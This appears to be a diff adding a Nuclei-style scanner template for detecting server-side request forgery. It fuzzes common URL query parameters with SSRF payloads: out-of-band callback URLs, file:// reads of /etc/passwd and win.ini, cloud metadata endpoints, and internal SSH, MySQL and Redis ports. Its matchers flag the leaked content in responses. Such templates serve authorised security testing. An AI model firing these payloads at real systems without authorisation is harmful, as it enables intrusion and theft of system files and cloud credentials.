@@ -1,0 +1,135 @@
+id: response-ssrf
+
+info:
+  name: Full Response SSRF Detection
+  author: pdteam,pwnhxl,j4vaovo,AmirHossein Raeisi
+  severity: high
+  reference:
+    - https://github.com/bugcrowd/HUNT/blob/master/ZAP/scripts/passive/SSRF.py
+  metadata:
+    max-request: 12
+  tags: ssrf,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      ssrf:
+        - 'http://{{interactsh-url}}'
+        - 'http://{{FQDN}}.{{interactsh-url}}'
+        - 'http://{{FQDN}}@{{interactsh-url}}'
+        - 'http://{{interactsh-url}}#{{FQDN}}'
+        - 'http://{{RDN}}.{{interactsh-url}}'
+        - 'http://{{RDN}}@{{interactsh-url}}'
+        - 'http://{{interactsh-url}}#{{RDN}}'
+        - 'file:////./etc/./passwd'
+        - 'file:///c:/./windows/./win.ini'
+        - 'http://metadata.tencentyun.com/latest/meta-data/'
+        - 'http://100.100.100.200/latest/meta-data/'
+        - 'http://169.254.169.254/latest/meta-data/'
+        - 'http://169.254.169.254/metadata/v1'
+        - 'http://127.0.0.1:22'
+        - 'http://127.0.0.1:3306'
+        - 'dict://127.0.0.1:6379/info'
+
+    fuzzing:
+      - part: query
+        mode: single
+        keys:
+          - callback
+          - continue
+          - data
+          - dest
+          - dir
+          - domain
+          - feed
+          - file
+          - host
+          - html
+          - imgurl
+          - navigation
+          - next
+          - open
+          - out
+          - page
+          - path
+          - port
+          - redirect
+          - reference
+          - return
+          - show
+          - site
+          - to
+          - uri
+          - url
+          - val
+          - validate
+          - view
+          - window
+        fuzz:
+          - "{{ssrf}}"
+
+      - part: query
+        mode: single
+        values:
+          - "(https|http|file)(%3A%2F%2F|://)(.*?)"
+        fuzz:
+          - "{{ssrf}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+
+      - type: word
+        part: body
+        words:
+          - "Interactsh Server"
+
+      - type: regex
+        part: body
+        regex:
+          - 'SSH-(\d.\d)-OpenSSH_(\d.\d)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(DENIED Redis|CONFIG REWRITE|NOAUTH Authentication)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(\d.\d.\d)(.*?)mysql_native_password'
+
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: regex
+        part: body
+        regex:
+          - 'dns-conf\/[\s\S]+instance\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'app-id[\s\S]+placement\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'ami-id[\s\S]+placement\/'
+
+      - type: regex
+        part: body
+        regex:
+          - 'id[\s\S]+interfaces\/'
+# digest: 4a0a0047304502207f56832537811f8d9f528fa5af83d562549394d54ea74bfc72bf2889fec20c51022100e697d5acec83a478cb8f60b02e1c90a45ba3575c99b879749d01ed38b8ea8c48:922c64590222798bb761d5b6d8e72950
